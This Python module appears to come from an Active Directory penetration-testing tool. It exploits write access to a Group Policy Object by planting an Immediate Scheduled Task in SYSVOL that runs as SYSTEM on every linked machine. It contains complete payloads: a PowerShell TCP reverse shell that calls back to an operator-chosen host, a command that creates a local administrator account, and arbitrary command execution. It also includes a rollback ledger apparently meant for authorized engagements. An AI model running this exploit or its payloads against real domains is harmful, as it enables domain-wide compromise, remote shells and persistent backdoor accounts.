"""Async exploit driver for GPO Immediate Scheduled Task abuse.

Given a GPC DN the principal can write, plant a Computer-side Immediate
Scheduled Task that the next ``gpupdate`` cycle on every linked machine will
run as ``NT AUTHORITY\\SYSTEM``. The vector composition is:

1. Mkdir ``\\<dc>\\SYSVOL\\<domain>\\Policies\\{<gpo>}\\Machine\\Preferences\\ScheduledTasks\\``
2. Upload ``ScheduledTasks.xml`` (built by :mod:`gpo_immediate_task_xml`).
3. Bump ``gpt.ini`` ``Version=`` so the GP client picks up the change.
4. Bump LDAP ``versionNumber`` and merge ``gPCMachineExtensionNames``.

Every mutation is recorded to the workspace
:class:`EnvironmentChangeLedger` *before* it is applied (write-ahead).
Rollback runs the inverse in reverse order. Failures during rollback mark
the corresponding ledger entry as ``failed`` / ``operator_required`` with
explicit cleanup instructions.

Vendor verification (read before writing):

* ``vendor/aiosmb/aiosmb/commons/interfaces/file.py:341`` — SMBFile.open mode
  ``"w"`` semantics (FILE_OPEN_IF + GENERIC_READ|GENERIC_WRITE).
* ``vendor/aiosmb/aiosmb/commons/interfaces/directory.py:115`` — directory
  CreateDisposition / desired_access pattern.
* ``vendor/badldap/badldap/client.py:175`` — ``pagedsearch`` signature.
* ``adscan_internal/services/exploitation/acl.py:915`` — sd.Dacl.aces +
  SD_FLAGS_DACL_CONTROL pattern (we mirror the modify path here for
  consistency).
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any, Awaitable, Callable, Optional

from adscan_internal import (
    print_error,
    print_info,
    print_info_debug,
    print_info_verbose,
    print_success,
    print_warning,
    telemetry,
)
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.gpo_immediate_task_xml import (
    bump_gpt_ini_version,
    build_immediate_task_xml,
    compute_next_machine_version,
    merge_machine_extension_names,
)
from adscan_internal.services.ldap_transport_service import (
    ADscanLDAPConfig,
    async_connect_with_ldap_fallback,
)
from adscan_internal.services.smb_transport import (
    SMBConfig,
    create_unc_directory,
    delete_unc_directory,
    delete_unc_file,
    download_unc_file_to_local,
    smb_machine_with_fallback,
    upload_unc_file_bytes,
)
from adscan_core.rich_output import print_exception


# ---------------------------------------------------------------------------
# Payload tagged-union
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class GPOPayload:
    """Tagged payload spec consumed by the exploit service.

    ``kind`` selects which builder is used; ``params`` carries the parameters.

    * ``"add_local_admin"`` — params: ``{"username": str, "password": str}``.
      Translates to ``net localgroup administrators <user> /add`` (after a
      best-effort ``net user <user> <password> /add``).
    * ``"reverse_shell_ps_b64"`` — params: ``{"ip": str, "port": int}``.
      Translates to a base64-encoded PowerShell TCP reverse shell.
    * ``"raw_command"`` — params: ``{"command": str}``. Whatever the operator
      specified, run via ``cmd.exe /c``.
    """

    kind: str
    params: dict[str, Any]


def _payload_to_command(payload: GPOPayload) -> tuple[str, bool]:
    """Translate a :class:`GPOPayload` to a ``(command, powershell)`` pair
    matching the contract of :func:`build_immediate_task_xml`.

    When ``powershell`` is True, ``command`` is the raw PowerShell script
    (the XML builder UTF-16-LE / base64 encodes it and wraps it in
    ``powershell.exe -enc``). Otherwise ``command`` is the cmd.exe payload
    (without the ``/c`` prefix — the builder adds it).
    """
    if payload.kind == "raw_command":
        cmd = str(payload.params.get("command", "")).strip()
        if not cmd:
            raise ValueError("raw_command payload requires non-empty 'command'")
        return cmd, False
    if payload.kind == "add_local_admin":
        user = str(payload.params.get("username", "")).strip()
        pwd = str(payload.params.get("password", "")).strip()
        if not user or not pwd:
            raise ValueError(
                "add_local_admin payload requires 'username' and 'password'"
            )
        compound = (
            f"net user {user} {pwd} /add & net localgroup administrators {user} /add"
        )
        return compound, False
    if payload.kind == "reverse_shell_ps_b64":
        ip = str(payload.params.get("ip", "")).strip()
        port = int(payload.params.get("port", 0))
        if not ip or port <= 0:
            raise ValueError(
                "reverse_shell_ps_b64 payload requires 'ip' and positive 'port'"
            )
        ps = (
            "$c=New-Object Net.Sockets.TCPClient('"
            + ip
            + "',"
            + str(port)
            + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
            "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()"
        )
        return ps, True
    raise ValueError(f"Unknown GPOPayload kind: {payload.kind!r}")


# ---------------------------------------------------------------------------
# Result dataclass
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class GPOImmediateTaskResult:
    """Outcome of :meth:`GPOExploitationMixin.run_exploit_gpo_immediate_task`."""

    success: bool
    gpo_dn: str
    task_name: str
    change_ids: tuple[str, ...]
    rolled_back: bool = False
    error: str | None = None


# ---------------------------------------------------------------------------
# Pre-flight: Protected Users guard
# ---------------------------------------------------------------------------


_PROTECTED_USERS_RID = 525  # well-known RID, domain-relative


async def _is_principal_in_protected_users(
    *, ldap_client: Any, principal_dn: str, domain_dn: str
) -> bool:
    """Return True if ``principal_dn`` is a member of the Protected Users group.

    Uses the LDAP_MATCHING_RULE_IN_CHAIN extensible match to get transitive
    membership — protected users membership via nested group still applies.
    """
    # Resolve the Protected Users group DN by SID-suffix match. The group's
    # SID is ``<domain SID>-525``; we filter by objectSid via the well-known
    # CN under CN=Users (canonical placement on every domain).
    pu_filter = "(&(objectClass=group)(samAccountName=Protected Users))"
    pu_dn: Optional[str] = None
    async for entry, err in ldap_client.pagedsearch(
        pu_filter, ["distinguishedName"], tree=domain_dn
    ):
        if err is not None or entry is None:
            continue
        attrs = entry.get("attributes", {}) if isinstance(entry, dict) else {}
        dn = attrs.get("distinguishedName") or entry.get("objectName")
        if dn:
            pu_dn = str(dn)
            break
    if not pu_dn:
        # Group not found — treat as not-a-member (older domains, or
        # Protected Users not provisioned). Not a security issue: the worst
        # case is the exploit runs and the KDC rejects RC4/etc, which the
        # transport already handles.
        print_info_debug(
            "[gpo-exploit] Protected Users group not found in domain; skipping guard"
        )
        return False

    chain_filter = (
        f"(&(distinguishedName={principal_dn})"
        f"(memberOf:1.2.840.113556.1.4.1941:={pu_dn}))"
    )
    async for entry, err in ldap_client.pagedsearch(
        chain_filter, ["distinguishedName"], tree=domain_dn
    ):
        if err is not None or entry is None:
            continue
        return True
    return False


# ---------------------------------------------------------------------------
# Service mixin
# ---------------------------------------------------------------------------


class GPOExploitationMixin:
    """GPO abuse exploitation operations mounted on :class:`ExploitationService`."""

    def __init__(self, parent_service) -> None:
        self.parent = parent_service
        self.logger = parent_service.logger

    async def run_exploit_gpo_immediate_task(
        self,
        *,
        ledger: Any,
        domain: str,
        dc_ip: str,
        dc_fqdn: str,
        auth_username: str,
        auth_password: str | None = None,
        auth_domain: str | None = None,
        use_kerberos: bool = False,
        ccache_path: str | None = None,
        gpo_dn: str,
        gpo_display_name: str,
        gpc_path: str,
        payload: GPOPayload,
        task_name: str | None = None,
        principal_dn_for_guard: str | None = None,
        auto_rollback: bool = True,
    ) -> GPOImmediateTaskResult:
        """Plant an Immediate Scheduled Task in ``gpo_dn`` and (optionally) roll back.

        Args:
            ledger: A live :class:`EnvironmentChangeLedger`.
            domain: Target AD domain (where the GPO lives).
            dc_ip: DC IP for the target domain.
            dc_fqdn: FQDN of the DC. Used for SYSVOL UNCs and Kerberos SPNs.
            auth_username: Authenticating user (sAMAccountName / UPN).
            auth_password: Password or NT hash. Required unless ``ccache_path``.
            auth_domain: Credential domain (defaults to ``domain``).
            use_kerberos: Force Kerberos (else NTLM-first with auto fallback).
            ccache_path: Optional Kerberos ccache path.
            gpo_dn: Distinguished name of the GPC to mutate.
            gpo_display_name: Display name (for ledger / logging).
            gpc_path: ``gPCFileSysPath`` from the GPC — full SYSVOL UNC root.
            payload: :class:`GPOPayload` describing the command to plant.
            task_name: Optional override for the visible task name.
            principal_dn_for_guard: DN of the auth principal, for the Protected
                Users pre-flight check. When provided and the principal is in
                Protected Users, abort hard before any mutation.
            auto_rollback: When True (default), revert immediately after a
                successful plant. The CLI wizard sets this to False when the
                operator explicitly chose to leave the change in place.

        Returns:
            :class:`GPOImmediateTaskResult`.
        """
        change_ids: list[str] = []
        # ``undo`` is a list of (description, async-callable) — executed in
        # reverse order on rollback / failure.
        undo_stack: list[tuple[str, Callable[[], Awaitable[None]]]] = []

        domain_dn = ",".join(f"DC={p}" for p in domain.split(".") if p)

        ldap_config = ADscanLDAPConfig(
            domain=domain,
            dc_ip=dc_ip,
            use_ldaps=True,
            use_kerberos=use_kerberos,
            username=auth_username,
            password=auth_password,
            kerberos_target_hostname=dc_fqdn,
            auth_domain=auth_domain or domain,
            auth_kdc=dc_ip,
            ccache_path=ccache_path,
        )

        smb_config = SMBConfig(
            target_ip=dc_ip,
            target_hostname=dc_fqdn,
            domain=domain,
            username=auth_username,
            password=auth_password,
            ccache_path=ccache_path,
            auth_domain=auth_domain or domain,
            kdc_ip=dc_ip,
            use_kerberos=use_kerberos,
        )

        # Build the XML payload up front (pure logic, deterministic).
        command_str, use_powershell = _payload_to_command(payload)
        effective_task_name = task_name or "ADscanTask"
        xml_bytes = build_immediate_task_xml(
            name=effective_task_name,
            command=command_str,
            powershell=use_powershell,
        ).encode("utf-8")

        sysvol_root = gpc_path.rstrip("\\")
        machine_dir = f"{sysvol_root}\\Machine"
        prefs_dir = f"{machine_dir}\\Preferences"
        sched_dir = f"{prefs_dir}\\ScheduledTasks"
        sched_xml_unc = f"{sched_dir}\\ScheduledTasks.xml"
        gpt_ini_unc = f"{sysvol_root}\\gpt.ini"

        masked_target = mark_sensitive(gpo_display_name or gpo_dn, "text")
        print_info(f"GPO immediate-task plant starting on {masked_target}")

        try:
            # ---- 0. Pre-flight: Protected Users guard ----------------------
            if principal_dn_for_guard:
                ldap_client, _ = await async_connect_with_ldap_fallback(ldap_config)
                try:
                    in_pu = await _is_principal_in_protected_users(
                        ldap_client=ldap_client,
                        principal_dn=principal_dn_for_guard,
                        domain_dn=domain_dn,
                    )
                finally:
                    try:
                        await ldap_client.disconnect()
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                        print_exception(exception=exc)
                if in_pu:
                    raise RuntimeError(
                        "Authenticating principal is a member of Protected Users; "
                        "RC4/NTLM/unconstrained delegation are blocked and the "
                        "Immediate Scheduled Task vector cannot complete reliably. "
                        "Aborting before any mutation."
                    )
                print_info_debug("[gpo-exploit] Protected Users guard passed")

            # ---- 1. Read gpt.ini current contents (for rollback) -----------
            import tempfile
            from pathlib import Path

            tmp_root = Path(tempfile.mkdtemp(prefix="adscan-gpo-"))
            gpt_ini_local = tmp_root / "gpt.ini.original"
            async with smb_machine_with_fallback(smb_config) as machine:
                try:
                    await download_unc_file_to_local(
                        machine, gpt_ini_unc, str(gpt_ini_local)
                    )
                    original_gpt_ini = gpt_ini_local.read_bytes()
                except Exception as exc:  # noqa: BLE001
                    telemetry.capture_exception(exc)
                    print_exception(exception=exc)
                    raise RuntimeError(
                        f"Failed to read existing gpt.ini at {gpt_ini_unc}: {exc}"
                    ) from exc

            # ---- 2. Read current versionNumber + gPCMachineExtensionNames --
            ldap_client, _ = await async_connect_with_ldap_fallback(ldap_config)
            try:
                current_version: int = 0
                current_extensions: str | None = None
                async for entry, err in ldap_client.pagedsearch(
                    "(objectClass=*)",
                    ["versionNumber", "gPCMachineExtensionNames"],
                    tree=gpo_dn,
                    search_scope=0,  # BASE
                ):
                    if err is not None or entry is None:
                        continue
                    attrs = (
                        entry.get("attributes", {}) if isinstance(entry, dict) else {}
                    )
                    raw_v = attrs.get("versionNumber")
                    if isinstance(raw_v, list):
                        raw_v = raw_v[0] if raw_v else None
                    try:
                        current_version = int(raw_v) if raw_v is not None else 0
                    except (TypeError, ValueError):
                        current_version = 0
                    raw_ext = attrs.get("gPCMachineExtensionNames")
                    if isinstance(raw_ext, list):
                        raw_ext = raw_ext[0] if raw_ext else None
                    current_extensions = str(raw_ext) if raw_ext is not None else None
                    break
            finally:
                try:
                    await ldap_client.disconnect()
                except Exception as exc:  # noqa: BLE001
                    telemetry.capture_exception(exc)
                    print_exception(exception=exc)

            new_version = compute_next_machine_version(current_version)
            new_extensions = merge_machine_extension_names(current_extensions)
            new_gpt_ini = bump_gpt_ini_version(original_gpt_ini, new_version)

            # ---- 3. Apply mutations with write-ahead ledger ---------------
            async with smb_machine_with_fallback(smb_config) as machine:
                # 3a. mkdir Preferences/ScheduledTasks (and parents if missing)
                async def _mkdir_with_ledger(unc: str) -> None:
                    cid = ledger.register_change(
                        kind="gpo_sysvol_dir_created",
                        domain=domain,
                        target=unc,
                        detail={"gpo_dn": gpo_dn, "path": unc},
                        method="gpo_immediate_task",
                    )
                    change_ids.append(cid)
                    try:
                        await create_unc_directory(machine, unc)
                    except Exception as exc:  # noqa: BLE001
                        msg = str(exc)
                        if "OBJECT_NAME_COLLISION" in msg.upper():
                            # Already exists — pop the ledger entry: nothing
                            # to roll back (we did not create it).
                            print_info_debug(
                                f"[gpo-exploit] mkdir noop (already exists): {unc}"
                            )
                            ledger.mark_reverted(cid)
                            change_ids.remove(cid)
                            return
                        raise
                    undo_stack.append(
                        (
                            f"mkdir {unc}",
                            _make_dir_undo(smb_config, unc, cid, ledger),
                        )
                    )

                for d in (machine_dir, prefs_dir, sched_dir):
                    await _mkdir_with_ledger(d)

                # 3b. upload ScheduledTasks.xml
                cid_xml = ledger.register_change(
                    kind="gpo_sysvol_file_created",
                    domain=domain,
                    target=sched_xml_unc,
                    detail={
                        "gpo_dn": gpo_dn,
                        "task_name": effective_task_name,
                        "size": len(xml_bytes),
                    },
                    method="gpo_immediate_task",
                )
                change_ids.append(cid_xml)
                await upload_unc_file_bytes(machine, sched_xml_unc, xml_bytes)
                undo_stack.append(
                    (
                        f"delete {sched_xml_unc}",
                        _make_file_undo(smb_config, sched_xml_unc, cid_xml, ledger),
                    )
                )

                # 3c. modify gpt.ini
                cid_gpt = ledger.register_change(
                    kind="gpo_gpt_ini_modified",
                    domain=domain,
                    target=gpt_ini_unc,
                    detail={
                        "gpo_dn": gpo_dn,
                        "old_size": len(original_gpt_ini),
                        "new_size": len(new_gpt_ini),
                        "old_bytes_b64": _b64(original_gpt_ini),
                    },
                    method="gpo_immediate_task",
                )
                change_ids.append(cid_gpt)
                await upload_unc_file_bytes(machine, gpt_ini_unc, new_gpt_ini)
                undo_stack.append(
                    (
                        f"restore {gpt_ini_unc}",
                        _make_gptini_undo(
                            smb_config, gpt_ini_unc, original_gpt_ini, cid_gpt, ledger
                        ),
                    )
                )

            # 3d. modify LDAP attributes (versionNumber + gPCMachineExtensionNames)
            cid_ldap = ledger.register_change(
                kind="gpo_ldap_attribute_modified",
                domain=domain,
                target=gpo_dn,
                detail={
                    "old_versionNumber": current_version,
                    "new_versionNumber": new_version,
                    "old_gPCMachineExtensionNames": current_extensions,
                    "new_gPCMachineExtensionNames": new_extensions,
                },
                method="gpo_immediate_task",
            )
            change_ids.append(cid_ldap)

            await _ldap_modify_versions(
                ldap_config=ldap_config,
                gpo_dn=gpo_dn,
                version=new_version,
                extensions=new_extensions,
            )
            undo_stack.append(
                (
                    f"restore LDAP attrs on {gpo_dn}",
                    _make_ldap_undo(
                        ldap_config,
                        gpo_dn,
                        current_version,
                        current_extensions,
                        cid_ldap,
                        ledger,
                    ),
                )
            )

            print_success(
                f"GPO immediate-task planted on {masked_target} "
                f"(task={effective_task_name})"
            )

            if auto_rollback:
                await _rollback(undo_stack, ledger)
                return GPOImmediateTaskResult(
                    success=True,
                    gpo_dn=gpo_dn,
                    task_name=effective_task_name,
                    change_ids=tuple(change_ids),
                    rolled_back=True,
                )

            return GPOImmediateTaskResult(
                success=True,
                gpo_dn=gpo_dn,
                task_name=effective_task_name,
                change_ids=tuple(change_ids),
                rolled_back=False,
            )

        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
            print_error(f"GPO immediate-task plant failed: {exc}")
            # Best-effort rollback of whatever did succeed.
            try:
                await _rollback(undo_stack, ledger)
            except Exception as rb_exc:  # noqa: BLE001
                telemetry.capture_exception(rb_exc)
                print_exception(exception=rb_exc)
                print_error(f"GPO rollback also failed: {rb_exc}")
            return GPOImmediateTaskResult(
                success=False,
                gpo_dn=gpo_dn,
                task_name=task_name or "ADscanTask",
                change_ids=tuple(change_ids),
                rolled_back=True,
                error=str(exc),
            )


# ---------------------------------------------------------------------------
# Internal: undo factories + rollback driver
# ---------------------------------------------------------------------------


def _b64(data: bytes) -> str:
    import base64

    return base64.b64encode(data).decode("ascii")


def _make_dir_undo(
    smb_config: SMBConfig, unc: str, change_id: str, ledger: Any
) -> Callable[[], Awaitable[None]]:
    async def _undo() -> None:
        try:
            async with smb_machine_with_fallback(smb_config) as machine:
                await delete_unc_directory(machine, unc)
            ledger.mark_reverted(change_id)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
            ledger.mark_failed(
                change_id,
                error=str(exc),
                manual_cleanup_instructions=(
                    f"Manually remove the directory {unc} on the SYSVOL share. "
                    "It was created by the GPO Immediate Scheduled Task abuse "
                    "and should be empty after the file/file-subdirectory cleanups."
                ),
            )
            raise

    return _undo


def _make_file_undo(
    smb_config: SMBConfig, unc: str, change_id: str, ledger: Any
) -> Callable[[], Awaitable[None]]:
    async def _undo() -> None:
        try:
            async with smb_machine_with_fallback(smb_config) as machine:
                await delete_unc_file(machine, unc)
            ledger.mark_reverted(change_id)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
            ledger.mark_failed(
                change_id,
                error=str(exc),
                manual_cleanup_instructions=(
                    f"Manually delete the file {unc} on SYSVOL. It was created "
                    "by the GPO Immediate Scheduled Task abuse."
                ),
            )
            raise

    return _undo


def _make_gptini_undo(
    smb_config: SMBConfig,
    unc: str,
    original_bytes: bytes,
    change_id: str,
    ledger: Any,
) -> Callable[[], Awaitable[None]]:
    async def _undo() -> None:
        try:
            async with smb_machine_with_fallback(smb_config) as machine:
                await upload_unc_file_bytes(machine, unc, original_bytes)
            ledger.mark_reverted(change_id)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
            import base64

            ledger.mark_operator_required(
                change_id,
                manual_cleanup_instructions=(
                    f"Failed to restore gpt.ini at {unc}. The original bytes "
                    f"are recorded in the ledger as 'old_bytes_b64' (base64). "
                    f"Decode and write back manually: "
                    f"echo {base64.b64encode(original_bytes).decode('ascii')[:32]}... "
                    f"| base64 -d > /tmp/gpt.ini && smbclient ..."
                ),
            )
            raise

    return _undo


def _make_ldap_undo(
    ldap_config: ADscanLDAPConfig,
    gpo_dn: str,
    old_version: int,
    old_extensions: str | None,
    change_id: str,
    ledger: Any,
) -> Callable[[], Awaitable[None]]:
    async def _undo() -> None:
        try:
            await _ldap_modify_versions(
                ldap_config=ldap_config,
                gpo_dn=gpo_dn,
                version=old_version,
                extensions=old_extensions,
            )
            ledger.mark_reverted(change_id)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
            ledger.mark_operator_required(
                change_id,
                manual_cleanup_instructions=(
                    f"Failed to restore versionNumber={old_version} and "
                    f"gPCMachineExtensionNames={old_extensions!r} on {gpo_dn}. "
                    "Restore manually via your AD admin tooling."
                ),
            )
            raise

    return _undo


async def _ldap_modify_versions(
    *,
    ldap_config: ADscanLDAPConfig,
    gpo_dn: str,
    version: int,
    extensions: str | None,
) -> None:
    """Set ``versionNumber`` and ``gPCMachineExtensionNames`` on ``gpo_dn``.

    Uses the async badldap client directly. We do not need SD_FLAGS for these
    standard attribute modifications.
    """
    client, _ = await async_connect_with_ldap_fallback(ldap_config)
    try:
        # badldap.modify(dn, changes, encode=True) encodes str values to
        # bytes itself — verified at vendor/badldap/badldap/client.py:1266.
        # Pass str values; passing bytes triggers double-encode AttributeError.
        change_dict: dict[str, list[tuple[str, list[str]]]] = {
            "versionNumber": [("replace", [str(version)])],
        }
        if extensions is not None:
            change_dict["gPCMachineExtensionNames"] = [("replace", [extensions])]

        # badldap MSLDAPClient.modify(dn, changes) — async.
        result = await client.modify(gpo_dn, change_dict)
        # Some badldap versions return (ok, err); others raise. Normalize.
        if isinstance(result, tuple) and len(result) == 2:
            ok, err = result
            if not ok:
                raise RuntimeError(
                    f"LDAP modify on {gpo_dn} returned {ok!r} err={err!r}"
                )
    finally:
        try:
            await client.disconnect()
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)


async def _rollback(
    undo_stack: list[tuple[str, Callable[[], Awaitable[None]]]],
    ledger: Any,
) -> None:
    """Execute ``undo_stack`` in reverse order, swallowing per-step failures.

    Each step is responsible for marking its own ledger entry; we swallow the
    raised exception here so subsequent steps still run (best-effort).
    """
    if not undo_stack:
        return
    print_info_verbose(
        f"Rolling back {len(undo_stack)} GPO mutation(s) in reverse order"
    )
    for description, undo in reversed(undo_stack):
        print_info_debug(f"[gpo-exploit] rollback step: {description}")
        try:
            await undo()
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
            print_warning(f"Rollback step failed (continuing): {description}: {exc}")
